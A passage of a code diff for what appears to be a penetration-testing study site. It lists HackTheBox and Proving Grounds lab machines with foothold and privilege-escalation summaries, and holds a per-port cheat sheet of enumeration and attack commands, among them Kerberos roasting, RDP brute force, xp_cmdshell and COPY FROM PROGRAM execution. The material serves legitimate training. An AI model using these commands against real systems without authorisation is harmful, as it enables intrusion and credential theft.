+    {n:"Grandpa",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"WebDAV / Kernel",fh:"IIS 6 CVE-2017-7269",pe:"churrasco token abuse"},
+    {n:"Jerry",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"Tomcat",fh:"Tomcat manager default creds → WAR",pe:"Runs as SYSTEM"},
+    {n:"Arctic",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"ColdFusion",fh:"ColdFusion traversal → shell",pe:"MS10-059 (Chimichurri)"},
+    {n:"Bounty",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"web.config",fh:"web.config ASP upload bypass",pe:"JuicyPotato / MS16-032"},
+    {n:"Bastion",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"VHD / mRemoteNG",fh:"Mount exposed VHD → dump SAM",pe:"mRemoteNG stored creds"},
+    {n:"Access",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"mdb / pst",fh:"Anon FTP mdb+pst → creds",pe:"Cached creds via runas"},
+    {n:"Servmon",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"NVMS / NSClient",fh:"NVMS-1000 LFI → creds",pe:"NSClient++ config abuse"},
+    {n:"Remote",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"Umbraco",fh:"NFS → Umbraco creds → auth RCE",pe:"TeamViewer stored creds"},
+    {n:"Buff",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"CMS / CloudMe BOF",fh:"Gym Management RCE",pe:"CloudMe buffer overflow via tunnel"},
+    {n:"Omni",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"Windows IoT",fh:"SirepRAT (Windows IoT Core)",pe:"Decrypt stored creds"},
+    {n:"Love",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"SSRF",fh:"SSRF → voting admin → file upload",pe:"AlwaysInstallElevated"},
+    {n:"Bastard",src:"HackTheBox",os:"Windows",diff:"Medium",focus:"Drupal",fh:"Drupalgeddon RCE",pe:"MS15-051 kernel"},
+    {n:"Chatterbox",src:"HackTheBox",os:"Windows",diff:"Medium",focus:"BOF",fh:"AChat buffer overflow",pe:"AlwaysInstallElevated / stored creds"},
+    {n:"Silo",src:"HackTheBox",os:"Windows",diff:"Medium",focus:"Oracle DB",fh:"Oracle TNS → odat RCE",pe:"SYSTEM via DB / memory dump"},
+    {n:"SecNotes",src:"HackTheBox",os:"Windows",diff:"Medium",focus:"SQLi / SMB / WSL",fh:"2nd-order SQLi → SMB upload PHP",pe:"WSL bash history creds"},
+    // HTB AD
+    {n:"Active",src:"HackTheBox",os:"AD",diff:"Easy",focus:"GPP / Kerberoast",fh:"GPP cpassword in SYSVOL share",pe:"Kerberoast Administrator SPN"},
+    {n:"Forest",src:"HackTheBox",os:"AD",diff:"Easy",focus:"AS-REP / DCSync",fh:"AS-REP roast svc-alfresco",pe:"WriteDACL → DCSync"},
+    {n:"Sauna",src:"HackTheBox",os:"AD",diff:"Easy",focus:"AS-REP / DCSync",fh:"AS-REP roast from user enum",pe:"AutoLogon creds → DCSync"},
+    {n:"Monteverde",src:"HackTheBox",os:"AD",diff:"Medium",focus:"Azure AD Sync",fh:"Spray → SMB share creds",pe:"Azure AD Connect DB password"},
+    {n:"Resolute",src:"HackTheBox",os:"AD",diff:"Medium",focus:"DnsAdmins",fh:"LDAP default pass → WinRM",pe:"DnsAdmins malicious DLL"},
+    {n:"Cascade",src:"HackTheBox",os:"AD",diff:"Medium",focus:"LDAP / Recycle Bin",fh:"LDAP enum → VNC password",pe:"AD Recycle Bin → group membership"},
+    {n:"Search",src:"HackTheBox",os:"AD",diff:"Medium",focus:"gMSA / Kerberoast",fh:"Kerberoast → cracked cred",pe:"Read gMSA password → cert abuse"},
+    {n:"Intelligence",src:"HackTheBox",os:"AD",diff:"Medium",focus:"gMSA / RBCD",fh:"PDF metadata → spray → ReadGMSAPassword",pe:"RBCD to Domain Controller"},
+    {n:"Nest",src:"HackTheBox",os:"AD",diff:"Medium",focus:"SMB / VB.NET",fh:"Anon SMB → config decrypt",pe:"Reverse VB.NET service binary"},
+    {n:"Blackfield",src:"HackTheBox",os:"AD",diff:"Hard",focus:"AS-REP / Backup Op",fh:"AS-REP roast → BloodHound ForceChangePassword",pe:"SeBackupPrivilege → dump NTDS"},
+    // Proving Grounds - Linux
+    {n:"Twiggy",src:"Proving Grounds",os:"Linux",diff:"Easy",focus:"Service RCE",fh:"Salt-API / service exploit",pe:"Misconfig / sudo"},
+    {n:"Astronaut",src:"Proving Grounds",os:"Linux",diff:"Easy",focus:"Web / PHP",fh:"Grav CMS PHP exploitation",pe:"Cron / GTFOBins"},
+    {n:"Blogger",src:"Proving Grounds",os:"Linux",diff:"Easy",focus:"WordPress",fh:"WordPress plugin + upload",pe:"SUID / sudo"},
+    {n:"Levram",src:"Proving Grounds",os:"Linux",diff:"Easy",focus:"Web",fh:"Gerapy RCE",pe:"Capabilities (python)"},
+    {n:"Snookums",src:"Proving Grounds",os:"Linux",diff:"Easy",focus:"Web",fh:"SimplePHPGal RCE",pe:"SUID / path"},
+    {n:"Payday",src:"Proving Grounds",os:"Linux",diff:"Easy",focus:"CMS",fh:"CS-Cart admin RCE",pe:"Password reuse → sudo"},
+    {n:"Wombo",src:"Proving Grounds",os:"Linux",diff:"Easy",focus:"Redis",fh:"Redis exposed → module RCE",pe:"Kernel / sudo"},
+    {n:"ClamAV",src:"Proving Grounds",os:"Linux",diff:"Easy",focus:"Mail / Service",fh:"Sendmail w/ clamav exploit",pe:"sudo / SUID"},
+    {n:"Boolean",src:"Proving Grounds",os:"Linux",diff:"Medium",focus:"Web / API",fh:"Web app logic + upload",pe:"Capabilities / SUID"},
+    {n:"Clue",src:"Proving Grounds",os:"Linux",diff:"Medium",focus:"Service",fh:"Service exploit chain",pe:"Custom binary / sudo"},
+    {n:"Hetemit",src:"Proving Grounds",os:"Linux",diff:"Medium",focus:"Web / RCE",fh:"CMS + Python service RCE",pe:"sudo scripting"},
+    {n:"Hunit",src:"Proving Grounds",os:"Linux",diff:"Medium",focus:"Service",fh:"Custom service + creds",pe:"Cron / SUID"},
+    {n:"Pelican",src:"Proving Grounds",os:"Linux",diff:"Medium",focus:"Deserialization",fh:"exiftool / Java deserialization",pe:"sudo (GTFOBins)"},
+    {n:"Peppo",src:"Proving Grounds",os:"Linux",diff:"Medium",focus:"Service",fh:"Service exploit → shell",pe:"Group / cron abuse"},
+    {n:"Sorcerer",src:"Proving Grounds",os:"Linux",diff:"Medium",focus:"Service",fh:"rsync / service misconfig",pe:"SUID / sudo"},
+    {n:"Zino",src:"Proving Grounds",os:"Linux",diff:"Medium",focus:"Service",fh:"SambaCry / service exploit",pe:"Service binary / sudo"},
+    // Proving Grounds - Windows
+    {n:"Algernon",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"Service RCE",fh:"SmarterMail RCE",pe:"Service runs as SYSTEM"},
+    {n:"Authby",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"FTP / Web",fh:"FTP creds → web upload",pe:"AlwaysInstallElevated"},
+    {n:"DVR4",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"Web RCE",fh:"Argus Surveillance DVR",pe:"Directory traversal creds"},
+    {n:"Helpdesk",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"Web / Exploit",fh:"ManageEngine exploit",pe:"MS10-059 / token"},
+    {n:"Hutch",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"AD / LDAP",fh:"Anonymous LDAP → description password",pe:"SeImpersonate → GodPotato"},
+    {n:"Kevin",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"Service",fh:"GoAhead / HP service exploit",pe:"Stored creds"},
+    {n:"Shenzi",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"SMB / Web",fh:"Open SMB → WordPress upload",pe:"AlwaysInstallElevated"},
+    {n:"Slort",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"Web / Service",fh:"Web param → binary drop",pe:"Scheduled task / service path"},
+    {n:"Squid",src:"Proving Grounds",os:"Windows",diff:"Easy",focus:"Proxy pivot",fh:"Squid proxy → internal services (spose)",pe:"Internal service exploit"},
+    {n:"Craft",src:"Proving Grounds",os:"Windows",diff:"Medium",focus:"Web",fh:"Web app RCE",pe:"Token / service"},
+    {n:"Internal",src:"Proving Grounds",os:"Windows",diff:"Medium",focus:"Service",fh:"Service exploit",pe:"Token impersonation"},
+    {n:"Jacko",src:"Proving Grounds",os:"Windows",diff:"Medium",focus:"Java / H2",fh:"H2 database console RCE",pe:"PrintNightmare / SeImpersonate"},
+    {n:"Medjed",src:"Proving Grounds",os:"Windows",diff:"Medium",focus:"Web",fh:"BarcodeAPI / web upload",pe:"Unquoted service / token"},
+    {n:"Nickel",src:"Proving Grounds",os:"Windows",diff:"Medium",focus:"Web / Service",fh:"API creds → service RCE",pe:"Stored creds / SeImpersonate"},
+    {n:"Nukem",src:"Proving Grounds",os:"Windows",diff:"Medium",focus:"Service",fh:"Service exploit chain",pe:"Registry / token"},
+    {n:"Resourced",src:"Proving Grounds",os:"Windows",diff:"Medium",focus:"AD",fh:"RPC user enum → password",pe:"RBCD / DCSync chain"},
+    // HTB - current V3 list (PEN-200 2023-2024) additions
+    {n:"Support",src:"HackTheBox",os:"AD",diff:"Easy",focus:"LDAP / RBCD",fh:"LDAP creds hard-coded in a shared .exe (dnSpy)",pe:"Resource-based constrained delegation → DC"},
+    {n:"Timelapse",src:"HackTheBox",os:"AD",diff:"Easy",focus:"PFX / LAPS",fh:"SMB share → crack .pfx cert → WinRM",pe:"Read LAPS password via group membership"},
+    {n:"Cicada",src:"HackTheBox",os:"AD",diff:"Easy",focus:"SMB / Spray",fh:"SMB guest → password in share → spray",pe:"SeBackupPrivilege → dump SAM/NTDS"},
+    {n:"Heist",src:"HackTheBox",os:"Windows",diff:"Easy",focus:"Cisco / Procdump",fh:"Cisco config type-7/hashes → crack → WinRM",pe:"Procdump firefox → admin creds"},
+    {n:"Escape",src:"HackTheBox",os:"AD",diff:"Medium",focus:"MSSQL / ADCS",fh:"MSSQL guest → coerce NTLM auth (responder)",pe:"ADCS ESC1 certificate → DA"},
+    {n:"Scrambled",src:"HackTheBox",os:"AD",diff:"Medium",focus:"Kerberos / Silver Ticket",fh:"Kerberos-only → silver ticket → MSSQL",pe:".NET deserialization service as SYSTEM"},
+    {n:"StreamIO",src:"HackTheBox",os:"AD",diff:"Medium",focus:"SQLi / LAPS",fh:"SQLi → admin panel → LFI → creds",pe:"LAPS read / firefox creds → DC"},
+    {n:"Manager",src:"HackTheBox",os:"AD",diff:"Medium",focus:"MSSQL / ADCS",fh:"SMB spray → MSSQL xp_dirtree → backup creds",pe:"ADCS ESC7 certificate abuse"},
+    {n:"Authority",src:"HackTheBox",os:"AD",diff:"Medium",focus:"Ansible / ADCS",fh:"Ansible vault → PWM LDAP creds",pe:"ADCS ESC1 pass-the-cert"},
+    {n:"Certified",src:"HackTheBox",os:"AD",diff:"Medium",focus:"ACL / ADCS",fh:"Given creds → BloodHound ACL chain (shadow creds)",pe:"ADCS ESC9 → DA"},
+    {n:"Administrator",src:"HackTheBox",os:"AD",diff:"Medium",focus:"ACL / DCSync",fh:"Given creds → GenericAll ACL chain",pe:"Targeted Kerberoast → DCSync"},
+    {n:"Editorial",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"SSRF",fh:"SSRF in book-upload → internal API leaks creds",pe:"git log leak → sudo python script"},
+    {n:"BoardLight",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Dolibarr / SUID",fh:"Dolibarr RCE (CVE-2023-30253)",pe:"Enlightenment SUID (CVE-2022-37706)"},
+    {n:"Usage",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Laravel / Wildcard",fh:"Laravel admin SQLi → avatar upload RCE",pe:"7z wildcard run as root → read SSH key"},
+    {n:"CozyHosting",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Spring Boot",fh:"Spring Actuator session hijack → RCE",pe:"Postgres creds reuse → sudo ssh (GTFOBins)"},
+    {n:"Keeper",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"KeePass",fh:"Request Tracker default creds admin:password",pe:"KeePass dump CVE-2023-32784 → root SSH key"},
+    {n:"Sau",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"SSRF / Maltrail",fh:"request-baskets SSRF → Maltrail RCE",pe:"sudo systemctl pager abuse (GTFOBins)"},
+    {n:"Broker",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"ActiveMQ",fh:"ActiveMQ RCE (CVE-2023-46604)",pe:"sudo nginx custom config → root"},
+    {n:"Busqueda",src:"HackTheBox",os:"Linux",diff:"Easy",focus:"Python eval",fh:"Searchor eval injection RCE",pe:"sudo git config → gitea container creds"},
+    {n:"Soccer",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"Upload / SQLi",fh:"Tiny File Manager default creds → upload",pe:"blind SQLi (websocket) → doas dstat"},
+    {n:"Monitored",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"SNMP / Nagios",fh:"SNMP leaks creds → Nagios XI SQLi → API RCE",pe:"sudo on service management scripts"},
+    {n:"Mentor",src:"HackTheBox",os:"Linux",diff:"Medium",focus:"SNMP / API",fh:"SNMP community string → API RCE",pe:"Postgres creds → sudo → root"}
+  ];
+
+  function slug(s){ return s.replace(/[^A-Za-z0-9]/g,""); }
+  function links(b){
+    var out = [];
+    if (b.src === "HackTheBox") {
+      out.push('<a href="https://app.hackthebox.com/machines/'+slug(b.n)+'" target="_blank" rel="noopener">HTB page</a>');
+      out.push('<a href="https://www.youtube.com/@ippsec/search?query='+encodeURIComponent(b.n)+'" target="_blank" rel="noopener">IppSec</a>');
+      out.push('<a href="https://www.google.com/search?q=0xdf+htb+'+encodeURIComponent(b.n)+'" target="_blank" rel="noopener">0xdf</a>');
+    } else {
+      out.push('<a href="https://portal.offsec.com/labs/play" target="_blank" rel="noopener">PG portal</a>');
+      out.push('<a href="https://www.google.com/search?q=proving+grounds+'+encodeURIComponent(b.n)+'+walkthrough" target="_blank" rel="noopener">Writeups</a>');
+    }
+    return out.join("");
+  }
+  function osLabel(o){ return o === "AD" ? "Active Directory" : o; }
+
+  var grid = document.getElementById("boxGrid");
+  function render(list){
+    grid.innerHTML = list.map(function(b){
+      var srcCls = b.src === "HackTheBox" ? "htb" : "pg";
+      var srcTxt = b.src === "HackTheBox" ? "HTB" : "PG";
+      return '<div class="box" data-src="'+b.src+'" data-os="'+b.os+'" data-diff="'+b.diff+'">'+
+        '<div class="box-head">'+
+          '<span class="diffdot d-'+b.diff+'"></span>'+
+          '<span class="box-name">'+b.n+'</span>'+
+          '<span class="box-badges"><span class="badge '+srcCls+'">'+srcTxt+'</span><span class="badge">'+(b.os==="AD"?"AD":b.os)+'</span></span>'+
+          '<span class="box-arrow">▸</span>'+
+        '</div>'+
+        '<div class="box-body">'+
+          '<div class="box-meta"><span class="chip">'+b.diff+'</span><span class="chip">'+osLabel(b.os)+'</span><span class="chip">'+b.focus+'</span></div>'+
+          '<div class="kv"><b>Foothold</b>'+b.fh+'</div>'+
+          '<div class="kv"><b>Privilege escalation</b>'+b.pe+'</div>'+
+          '<div class="box-links">'+links(b)+'</div>'+
+        '</div>'+
+      '</div>';
+    }).join("");
+    document.getElementById("boxCount").textContent = list.length + " boxes";
+  }
+
+  /* filter state */
+  var state = { src:"all", os:"all", diff:"all", q:"" };
+  function apply(){
+    var list = BOXES.filter(function(b){
+      if (state.src!=="all" && b.src!==state.src) return false;
+      if (state.os!=="all" && b.os!==state.os) return false;
+      if (state.diff!=="all" && b.diff!==state.diff) return false;
+      if (state.q){
+        var hay = (b.n+" "+b.focus+" "+b.fh+" "+b.pe+" "+osLabel(b.os)+" "+b.src).toLowerCase();
+        if (hay.indexOf(state.q) === -1) return false;
+      }
+      return true;
+    });
+    render(list);
+  }
+
+  document.getElementById("boxFilters").addEventListener("click", function(e){
+    var btn = e.target.closest(".filt"); if(!btn) return;
+    var g = btn.getAttribute("data-g"), f = btn.getAttribute("data-f");
+    // toggle within group
+    document.querySelectorAll('.filt[data-g="'+g+'"]').forEach(function(x){ x.classList.remove("on"); });
+    if (g==="src" && f==="all"){ state.src="all"; }
+    else if (state[g]===f){ state[g]="all"; /* clicking active clears (except handled below) */ }
+    else { state[g]=f; }
+    // ensure the clicked one is on unless we cleared it
+    if (state[g]===f) btn.classList.add("on");
+    // if a group is 'all', highlight the All button only for src group
+    if (g!=="src" && state[g]==="all"){ /* no visual all button for os/diff */ }
+    if (g==="src" && state.src==="all"){ document.querySelector('.filt[data-f="all"]').classList.add("on"); }
+    apply();
+  });
+  document.getElementById("boxSearch").addEventListener("input", function(e){
+    state.q = e.target.value.toLowerCase().trim(); apply();
+  });
+  grid.addEventListener("click", function(e){
+    var head = e.target.closest(".box-head"); if(!head) return;
+    if (e.target.closest("a")) return;
+    head.parentElement.classList.toggle("open");
+  });
+
+  document.getElementById("boxTotal").textContent = BOXES.length;
+  render(BOXES);
+
+  /* ---------- ports quick-ref ---------- */
+  var HT = "https://book.hacktricks.xyz/network-services-pentesting/";
+  var PORTS = [
+    {p:"21",s:"FTP",c:"file",d:"File transfer. Check anonymous login and writable dirs.",cmd:["ftp $IP   # user: anonymous","wget -m ftp://anonymous:x@$IP"],n:"Anonymous login, plaintext creds, upload a webshell if it maps to web root, version exploits (vsftpd 2.3.4 backdoor).",ref:"pentesting-ftp"},
+    {p:"22",s:"SSH",c:"remote",d:"Secure shell. Reuse found keys or brute weak creds.",cmd:["ssh user@$IP","ssh -i id_rsa user@$IP   # chmod 600 first"],n:"Weak or reused creds, found private keys, username enum on old OpenSSH, crack key passphrase with ssh2john.",ref:"pentesting-ssh"},
+    {p:"23",s:"Telnet",c:"remote",d:"Plaintext remote shell.",cmd:["telnet $IP"],n:"Default or weak creds, banner leaks, sniffable credentials.",ref:"pentesting-telnet"},
+    {p:"25",s:"SMTP",c:"mail",d:"Mail transfer. Enumerate valid usernames.",cmd:["smtp-user-enum -M RCPT -U users.txt -t $IP","nc $IP 25   # VRFY root"],n:"User enum (VRFY/EXPN/RCPT), open relay, internal hostnames in the banner.",ref:"pentesting-smtp"},
+    {p:"53",s:"DNS",c:"other",d:"Name resolution. Try a zone transfer.",cmd:["dig axfr @$IP domain.htb","dnsrecon -d domain.htb -n $IP -t axfr"],n:"AXFR zone transfer dumps every host, subdomain brute-force, add discovered hostnames to /etc/hosts.",ref:"pentesting-dns"},
+    {p:"69/udp",s:"TFTP",c:"file",d:"Trivial FTP with no authentication.",cmd:["tftp $IP","tftp> get config"],n:"No-auth read and write, grab device configs, upload payloads to known paths.",ref:"69-udp-tftp"},
+    {p:"79",s:"Finger",c:"other",d:"User information service.",cmd:["finger @$IP","finger root@$IP"],n:"Username enumeration and home-directory disclosure.",ref:"pentesting-finger"},
+    {p:"88",s:"Kerberos",c:"windows",d:"AD authentication. Roast accounts.",cmd:["GetNPUsers.py dom/ -usersfile u.txt -no-pass","kerbrute userenum -d dom u.txt"],n:"AS-REP roasting (no preauth), Kerberoasting, username enum, watch for clock skew errors.",ref:"pentesting-kerberos-88"},
+    {p:"110",s:"POP3",c:"mail",d:"Mailbox retrieval.",cmd:["nc $IP 110","USER bob / PASS pass"],n:"Weak creds, read mailboxes for credentials and flags.",ref:"pentesting-pop"},
+    {p:"111",s:"RPCbind",c:"file",d:"Portmapper. Find NFS and RPC services.",cmd:["rpcinfo -p $IP","showmount -e $IP"],n:"Locate NFS exports and other RPC services to attack next.",ref:"pentesting-rpcbind"},
+    {p:"135",s:"MSRPC",c:"windows",d:"Windows RPC endpoint mapper.",cmd:["rpcdump.py $IP","rpcclient -U '' -N $IP"],n:"Enumerate users and shares via rpcclient, DCOM lateral movement, impacket tooling.",ref:"135-pentesting-msrpc"},
+    {p:"139/445",s:"SMB",c:"windows",d:"Windows file sharing. The CTF goldmine.",cmd:["enum4linux-ng -A $IP","smbclient -L //$IP -N","smbmap -H $IP -u '' -p ''"],n:"Null sessions, readable or writable shares, EternalBlue (MS17-010), GPP passwords, user enum, upload webshells.",ref:"pentesting-smb"},
+    {p:"143",s:"IMAP",c:"mail",d:"Mailbox retrieval.",cmd:["nc $IP 143","curl -k imaps://$IP -u user:pass"],n:"Weak creds, read mail for secrets and reused passwords.",ref:"pentesting-imap"},
+    {p:"161/udp",s:"SNMP",c:"other",d:"Network management. Leaks a huge amount of info.",cmd:["snmpwalk -v2c -c public $IP","onesixtyone -c strings.txt $IP"],n:"Guess community strings (public/private), dump users, processes, ports, sometimes plaintext creds in configs.",ref:"pentesting-snmp"},
+    {p:"389/636",s:"LDAP",c:"windows",d:"Directory service. Dump the domain.",cmd:["ldapsearch -x -H ldap://$IP -b 'dc=dom,dc=htb'","ldapdomaindump -u 'dom\\\\u' -p pass $IP"],n:"Anonymous bind, dump users and descriptions (passwords hide here), map the whole domain.",ref:"pentesting-ldap"},
+    {p:"80/443",s:"HTTP / HTTPS",c:"web",d:"Web application. The most common foothold.",cmd:["whatweb http://$IP","feroxbuster -u http://$IP -w raft-medium-directories.txt","nikto -h $IP"],n:"Directory and vhost brute, CMS exploits, LFI/SQLi/upload/command-injection, secrets in JS and comments, /robots.txt.",ref:"pentesting-web"},
+    {p:"512-514",s:"R-services",c:"remote",d:"rexec / rlogin / rsh trust relationships.",cmd:["rlogin $IP -l root","rsh $IP whoami"],n:"Trusted-host misconfig gives passwordless login, often straight to root.",ref:"pentesting-rlogin"},
+    {p:"623/udp",s:"IPMI",c:"other",d:"Baseboard management controller.",cmd:["msf> use auxiliary/scanner/ipmi/ipmi_dumphashes"],n:"IPMI 2.0 password-hash disclosure, default BMC creds (ADMIN/ADMIN).",ref:"623-udp-ipmi"},
+    {p:"873",s:"rsync",c:"file",d:"File sync daemon. List and pull modules.",cmd:["rsync -av rsync://$IP","rsync -av rsync://$IP/src ./loot"],n:"Anonymous module access, read and write files, occasionally the whole root filesystem.",ref:"873-pentesting-rsync"},
+    {p:"1099",s:"Java RMI",c:"other",d:"Java remote method invocation.",cmd:["nmap -p1099 --script rmi-dumpregistry $IP"],n:"Insecure deserialization RCE (ysoserial), enumerate with BaRMIe.",ref:"1099-pentesting-java-rmi"},
+    {p:"1433",s:"MSSQL",c:"db",d:"Microsoft SQL Server.",cmd:["impacket-mssqlclient u:p@$IP -windows-auth","SQL> EXEC xp_cmdshell 'whoami'"],n:"Weak sa creds, xp_cmdshell RCE, capture NetNTLM via xp_dirtree, login impersonation.",ref:"pentesting-mssql-microsoft-sql-server"},
+    {p:"1521",s:"Oracle TNS",c:"db",d:"Oracle database listener.",cmd:["odat all -s $IP","nmap --script oracle-sid-brute -p1521 $IP"],n:"SID brute-force, default creds (scott/tiger), odat for file read and RCE.",ref:"1521-1522-1529-pentesting-oracle-listener"},
+    {p:"2049",s:"NFS",c:"file",d:"Network file share.",cmd:["showmount -e $IP","mount -o vers=3 -t nfs $IP:/share /mnt"],n:"no_root_squash lets you drop a SUID-root binary for local privesc, readable exports leak creds.",ref:"nfs-service-pentesting"},
+    {p:"3128",s:"Squid Proxy",c:"web",d:"HTTP proxy. Pivot to internal ports.",cmd:["curl -x http://$IP:3128 http://127.0.0.1","spose.py --proxy http://$IP:3128 --target 127.0.0.1"],n:"Reach internal-only services through the proxy, scan localhost ports.",ref:"3128-pentesting-squid"},
+    {p:"3306",s:"MySQL",c:"db",d:"MySQL / MariaDB.",cmd:["mysql -h $IP -u root","mysql -h $IP -u root -p"],n:"Weak or empty root password, read files with LOAD_FILE, UDF RCE, creds in application tables.",ref:"pentesting-mysql"},
+    {p:"3389",s:"RDP",c:"windows",d:"Windows Remote Desktop.",cmd:["xfreerdp /u:user /p:pass /v:$IP","hydra -L u -P p rdp://$IP"],n:"Weak creds, BlueKeep (CVE-2019-0708), pass-the-hash with restricted admin mode.",ref:"pentesting-rdp"},
+    {p:"5432",s:"PostgreSQL",c:"db",d:"Postgres database.",cmd:["psql -h $IP -U postgres","postgres=# COPY x FROM PROGRAM 'id'"],n:"Weak creds, COPY FROM PROGRAM RCE, read local files.",ref:"pentesting-postgresql"},
+    {p:"5900",s:"VNC",c:"remote",d:"Remote desktop.",cmd:["vncviewer $IP::5900"],n:"No or weak password, crack the stored VNC password, unauthenticated GUI access.",ref:"pentesting-vnc"},
+    {p:"5985/5986",s:"WinRM",c:"windows",d:"Windows remote management. Instant shell with creds.",cmd:["evil-winrm -i $IP -u user -p pass","evil-winrm -i $IP -u user -H nthash"],n:"Valid creds give a full shell, pass-the-hash, requires Remote Management Users or admin.",ref:"pentesting-winrm"},
+    {p:"6379",s:"Redis",c:"db",d:"In-memory key-value store.",cmd:["redis-cli -h $IP","redis-cli -h $IP info"],n:"Unauthenticated access, write an SSH key, webshell or cron, module-load RCE.",ref:"pentesting-redis"},
+    {p:"6667",s:"IRC",c:"other",d:"Chat relay.",cmd:["nc $IP 6667"],n:"UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075), version-specific exploits.",ref:"pentesting-irc"},
+    {p:"8080/8443",s:"HTTP-alt / Tomcat",c:"web",d:"Alternate web and application servers.",cmd:["curl -s http://$IP:8080","hydra tomcat /manager/html"],n:"Tomcat manager default creds lead to WAR-upload RCE, Jenkins, dev apps, proxied internals.",ref:"pentesting-web"},
+    {p:"8009",s:"AJP",c:"web",d:"Apache JServ Protocol (Tomcat connector).",cmd:["nmap -p8009 --script ajp-methods $IP"],n:"Ghostcat (CVE-2020-1938) file read and potential RCE.",ref:"8009-pentesting-apache-jserv-protocol-ajp"},
+    {p:"9200",s:"Elasticsearch",c:"db",d:"Search engine and JSON datastore.",cmd:["curl http://$IP:9200/_cat/indices?v","curl http://$IP:9200/_search?pretty"],n:"Unauthenticated data, old-version RCE (CVE-2015-1427), dump indices for creds.",ref:"9200-pentesting-elasticsearch"},
+    {p:"11211",s:"Memcached",c:"db",d:"Memory object cache.",cmd:["nc $IP 11211","stats items"],n:"Unauthenticated data dump, UDP reflection and amplification.",ref:"11211-memcache"},
+    {p:"27017",s:"MongoDB",c:"db",d:"NoSQL document database.",cmd:["mongosh mongodb://$IP","test> show dbs"],n:"Unauthenticated access, dump collections for credentials and flags.",ref:"27017-27018-mongodb"}
+  ];
+  var pesc = function(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); };
+  var pcatLabel = {web:"Web",windows:"Windows/AD",db:"Database",mail:"Mail",remote:"Remote",file:"File/Share",other:"Other"};
+  var portGrid = document.getElementById("portGrid");
+  function renderPorts(list){
+    portGrid.innerHTML = list.map(function(p){
+      return '<div class="portcard">'
+        + '<div class="ph"><span class="pno">'+pesc(p.p)+'</span><span class="psvc">'+pesc(p.s)+'</span><span class="pcat">'+pcatLabel[p.c]+'</span></div>'
+        + '<div class="pdesc">'+pesc(p.d)+'</div>'
+        + '<div class="code"><pre>'+pesc(p.cmd.join("\n"))+'</pre></div>'
+        + '<div class="pnote"><b>Attack vectors</b>'+pesc(p.n)+'</div>'
+        + '<div class="pref"><a href="'+HT+p.ref+'" target="_blank" rel="noopener">HackTricks reference</a></div>'
+        + '</div>';
+    }).join("");
+    document.getElementById("portCount").textContent = list.length + " services";
+  }
+  var pState = { c:"all", q:"" };
+  function applyPorts(){
+    var list = PORTS.filter(function(p){
+      if (pState.c!=="all" && p.c!==pState.c) return false;
+      if (pState.q){
+        var hay = (p.p+" "+p.s+" "+p.d+" "+p.n+" "+p.cmd.join(" ")).toLowerCase();
+        if (hay.indexOf(pState.q)===-1) return false;
+      }
+      return true;
+    });
+    renderPorts(list);
+  }
+  document.getElementById("portFilters").addEventListener("click", function(e){
+    var b = e.target.closest(".filt"); if(!b) return;
+    document.querySelectorAll("#portFilters .filt").forEach(function(x){ x.classList.remove("on"); });
+    b.classList.add("on"); pState.c = b.getAttribute("data-f"); applyPorts();
+  });
+  document.getElementById("portSearch").addEventListener("input", function(e){
+    pState.q = e.target.value.toLowerCase().trim(); applyPorts();
+  });
+  renderPorts(PORTS);
+
+  /* ---------- page router ---------- */
+  var pages = ["home","plan","cheatsheet","toolbox","ports","boxes","resources"];
+  function go(name){
+    if (pages.indexOf(name)===-1) name="home";
+    pages.forEach(function(p){
+      document.getElementById("page-"+p).classList.toggle("active", p===name);
+    });
+    document.querySelectorAll('nav.tabs a').forEach(function(a){
+      a.classList.toggle("active", a.getAttribute("data-nav")===name);
+    });
+    if (location.hash.replace("#","") !== name) history.replaceState(null,"","#"+name);
+    closeMenu();
+    window.scrollTo(0,0);
+  }
+  var tabsNav = document.getElementById("tabs");
+  var menuToggle = document.getElementById("menuToggle");
+  function closeMenu(){
+    tabsNav.classList.remove("open");
+    menuToggle.classList.remove("open");
+    menuToggle.setAttribute("aria-expanded","false");
+  }
+  menuToggle.addEventListener("click", function(){
+    var open = tabsNav.classList.toggle("open");
+    menuToggle.classList.toggle("open", open);
+    menuToggle.setAttribute("aria-expanded", open ? "true" : "false");
+  });
+  document.addEventListener("click", function(e){
+    if (tabsNav.classList.contains("open") && !e.target.closest("header.top")) closeMenu();
+  });
+  document.querySelectorAll("[data-nav]").forEach(function(el){
+    el.addEventListener("click", function(){ go(el.getAttribute("data-nav")); });
+    el.addEventListener("keydown", function(ev){ if(ev.key==="Enter"||ev.key===" "){ ev.preventDefault(); go(el.getAttribute("data-nav")); } });
+  });
+  window.addEventListener("hashchange", function(){ go(location.hash.replace("#","")); });
+  go(location.hash.replace("#","") || "home");
+
+  /* sub-nav smooth scroll (cheat sheet + toolbox) */
+  document.addEventListener("click", function(e){
+    var a = e.target.closest(".subnav [data-cheat]"); if(!a) return;
+    var t = document.getElementById(a.getAttribute("data-cheat"));
+    if (t) t.scrollIntoView({behavior:"smooth", block:"start"});
+  });
+
+  /* theme toggle */
